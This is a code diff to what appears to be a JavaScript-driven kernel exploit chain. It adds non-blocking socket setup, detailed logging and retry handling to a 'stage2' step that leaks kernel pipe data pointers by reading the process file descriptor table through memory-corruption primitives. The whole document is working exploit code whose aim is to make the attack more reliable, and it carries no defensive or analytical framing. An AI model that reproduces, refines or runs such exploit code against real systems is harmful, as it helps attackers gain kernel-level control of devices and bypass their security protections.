@@ -534,6 +534,12 @@
             syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
             S.uio_sock_a = Number(read32(sv2));
             S.uio_sock_b = Number(read32(sv2 + 4n));
+
+            // Keep JS-side drains from blocking forever if a worker-side
+            // primitive misses its expected socket write. Worker write/read
+            // ends remain blocking to preserve their normal synchronization.
+            syscall(SYSCALL.fcntl, BigInt(S.iov_sock_a), F_SETFL, O_NONBLOCK);
+            syscall(SYSCALL.fcntl, BigInt(S.uio_sock_a), F_SETFL, O_NONBLOCK);
         }
 
         function setup_iov_buffers(S) {
@@ -1252,32 +1258,59 @@
             send_notification("Stage 2\nLeak pipe data pointers");
             await ulog("stage2: leaking pipe pointers...");
             for (let attempt = 0; attempt < 5; attempt++) {
+                await ulog("stage2: attempt " + (attempt + 1) + "/5");
                 repair_triplets(S); nanosleep_ms(100);
+                await ulog("stage2: reading fd table");
                 const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
-                if (!fdescenttbl) continue;
+                if (!fdescenttbl) {
+                    await ulog("stage2: fd table read failed");
+                    continue;
+                }
                 S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
+                await ulog("stage2: fd table=" + toHex(fdescenttbl));
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
+                await ulog("stage2: reading master file pointer");
                 const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
-                if (!master_fp) continue;
+                if (!master_fp) {
+                    await ulog("stage2: master file pointer read failed");
+                    continue;
+                }
+                await ulog("stage2: master_fp=" + toHex(master_fp));
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
+                await ulog("stage2: reading victim file pointer");
                 const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
-                if (!victim_fp) continue;
+                if (!victim_fp) {
+                    await ulog("stage2: victim file pointer read failed");
+                    continue;
+                }
+                await ulog("stage2: victim_fp=" + toHex(victim_fp));
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
+                await ulog("stage2: reading master pipe data");
                 S.master_pipe_data = kslow64(S, master_fp);
-                if (!S.master_pipe_data) continue;
+                if (!S.master_pipe_data) {
+                    await ulog("stage2: master pipe data read failed");
+                    continue;
+                }
+                await ulog("stage2: master_pipe_data=" + toHex(S.master_pipe_data));
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
+                await ulog("stage2: reading victim pipe data");
                 S.victim_pipe_data = kslow64(S, victim_fp);
-                if (!S.victim_pipe_data) continue;
+                if (!S.victim_pipe_data) {
+                    await ulog("stage2: victim pipe data read failed");
+                    continue;
+                }
+                await ulog("stage2: victim_pipe_data=" + toHex(S.victim_pipe_data));
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
                     await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
+                await ulog("stage2: pipe data pointers matched; retrying");
                 nanosleep_ms(500); repair_triplets(S);
             }
             fail("stage2: failed to leak pipe pointers");
@@ -2066,6 +2099,8 @@
                     s123_ok = true;
                 } catch (e) {
                     if (r < 8) {
+                        await ulog("stages 1-3 attempt " + r + "/8 failed: " +
+                            e.message);
                         try { repair_triplets(S); } catch (_) { }
                         nanosleep_ms(500);
                     }
